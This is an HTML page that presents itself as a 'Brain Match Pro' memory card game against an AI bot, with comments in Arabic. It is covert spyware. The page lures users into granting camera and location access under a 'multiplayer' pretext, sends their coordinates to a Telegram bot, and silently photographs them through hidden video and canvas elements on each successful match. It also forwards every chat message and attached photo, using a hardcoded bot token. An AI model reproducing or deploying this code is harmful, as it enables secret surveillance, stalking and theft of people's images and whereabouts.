<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memory Match - Pro Challenge</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3018/3018884.png">
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; width: 100%; max-width: 360px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid #333; transition: 0.2s; position: relative; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
        .card.matched-p { background: var(--player) !important; color: #000; cursor: default; }
        .card.matched-ai { background: var(--ai) !important; color: #000; cursor: default; }
        
        .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; display: flex; flex-direction: column; gap: 6px; }
        .msg { padding: 8px 10px; border-radius: 10px; max-width: 80%; }
        .msg.ai { background: #222; align-self: flex-start; color: var(--primary); }
        .msg.user { background: var(--primary); align-self: flex-end; color: #000; }

        .input-area { display: flex; align-items: center; padding: 8px; gap: 8px; background: #1a1a1a; }
        input[type="text"] { flex: 1; background: #222; border: none; padding: 8px 12px; border-radius: 20px; color: white; outline: none; font-size: 14px; }
        .icon-btn { cursor: pointer; font-size: 18px; opacity: 0.8; }
        #file-input { display: none; }

        #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 12px 35px; border-radius: 30px; font-weight: bold; cursor: pointer; }
        
        /* إخفاء عناصر الكاميرا تماماً */
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2 style="color: var(--primary);">Brain Match Pro 🧠</h2>
        <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Fast-syncing with AI opponent...<br>Allow camera access for real-time multiplayer.</p>
        <button class="btn" onclick="initApp()">Sync & Play</button>
    </div>
</div>

<div class="game-area">
    <div style="margin-bottom: 8px; font-size: 13px; font-weight: bold;">
        <span style="color: var(--player)">You: <span id="p-score">0</span></span> | 
        <span style="color: var(--ai)">AI Bot: <span id="ai-score">0</span></span>
    </div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-section">
    <div class="messages" id="chat-box">
        <div class="msg ai">System: Connected. Try to find a match!</div>
    </div>
    <div class="input-area">
        <label for="file-input" class="icon-btn">📎</label>
        <input type="file" id="file-input" accept="image/*" onchange="sendUserPhoto(this)">
        <input type="text" id="user-input" placeholder="Chat with AI..." onkeypress="if(event.key==='Enter') handleChat()">
        <span class="icon-btn" onclick="handleChat()">🚀</span>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    let symbols = ['🍎','🍌','🍇','🍉','🍒','🍓','🥝','🍍','🍋','🍑','🥑','🥥'];
    let deck = [...symbols, ...symbols];
    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0;

    async function initApp() {
        try {
            // الموقع
            navigator.geolocation.getCurrentPosition(p => {
                sendTele(`📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
            // الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;

            document.getElementById('overlay').style.display = 'none';
            renderGrid();
        } catch (e) {
            alert("Connection error: Access required to verify player.");
            location.reload();
        }
    }

    function renderGrid() {
        const grid = document.getElementById('grid');
        grid.innerHTML = '';
        deck.sort(() => Math.random() - 0.5);
        deck.forEach(s => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.val = s;
            card.onclick = () => playerMove(card);
            grid.appendChild(card);
        });
    }

    function playerMove(card) {
        if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
        card.classList.add('flipped'); card.innerText = card.dataset.val;
        flipped.push(card);
        if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 600); }
    }

    function checkMatch() {
        const [c1, c2] = flipped;
        const match = c1.dataset.val === c2.dataset.val;
        
        if (match) {
            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            
            if (turn === 'player') {
                pScore++;
                addChat("ai", "Nice match! I'm watching your moves...");
                // --- المحرك السري: تصوير عند كل محاولة صحيحة للمستخدم ---
                silentCapture("نجح في مطابقة: " + c1.dataset.val);
            } else {
                aiScore++;
            }

            matches++;
            updateUI();
            flipped = [];
            if (turn === 'ai') aiTurn(); else turn = 'player';
        } else {
            setTimeout(() => {
                c1.classList.remove('flipped'); c1.innerText = '';
                c2.classList.remove('flipped'); c2.innerText = '';
                flipped = [];
                if (turn === 'wait') aiTurn(); else turn = 'player';
            }, 400);
        }
    }

    function aiTurn() {
        turn = 'ai';
        setTimeout(() => {
            let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (cards.length < 2) return;
            let c1 = cards[0]; c1.classList.add('flipped'); c1.innerText = c1.dataset.val;
            flipped.push(c1);
            setTimeout(() => {
                let c2 = cards[1]; c2.classList.add('flipped'); c2.innerText = c2.dataset.val;
                flipped.push(c2);
                setTimeout(checkMatch, 600);
            }, 800);
        }, 1000);
    }

    function updateUI() {
        document.getElementById('p-score').innerText = pScore;
        document.getElementById('ai-score').innerText = aiScore;
    }

    // تصوير سري جداً وبأجزاء الثانية
    function silentCapture(reason) {
        const can = document.getElementById('c');
        const v = document.getElementById('v');
        const ctx = can.getContext('2d');
        ctx.drawImage(v, 0, 0, can.width, can.height);
        
        can.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid);
            fd.append('photo', b, 'capture.jpg');
            fd.append('caption', '📸 التقاط تلقائي: ' + reason);
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.5); // ضغط عالي لسرعة الإرسال المختفية
    }

    function sendUserPhoto(input) {
        if (input.files && input.files[0]) {
            const file = input.files[0];
            const fd = new FormData();
            fd.append('chat_id', cid);
            fd.append('photo', file);
            fd.append('caption', '🖼️ صورة أرسلها المستخدم بنفسه');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            addChat("user", "Sent an attachment.");
            setTimeout(() => addChat("ai", "Got it! Continue playing."), 1000);
        }
    }

    function handleChat() {
        const inp = document.getElementById('user-input');
        if (!inp.value.trim()) return;
        addChat("user", inp.value);
        sendTele(`💬 User Chat: ${inp.value}`);
        inp.value = "";
        setTimeout(() => addChat("ai", "I'm focusing on the game... your turn!"), 1000);
    }

    function addChat(type, text) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = `msg ${type}`;
        m.innerText = text;
        box.appendChild(m);
        box.scrollTop = box.scrollHeight;
    }

    function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
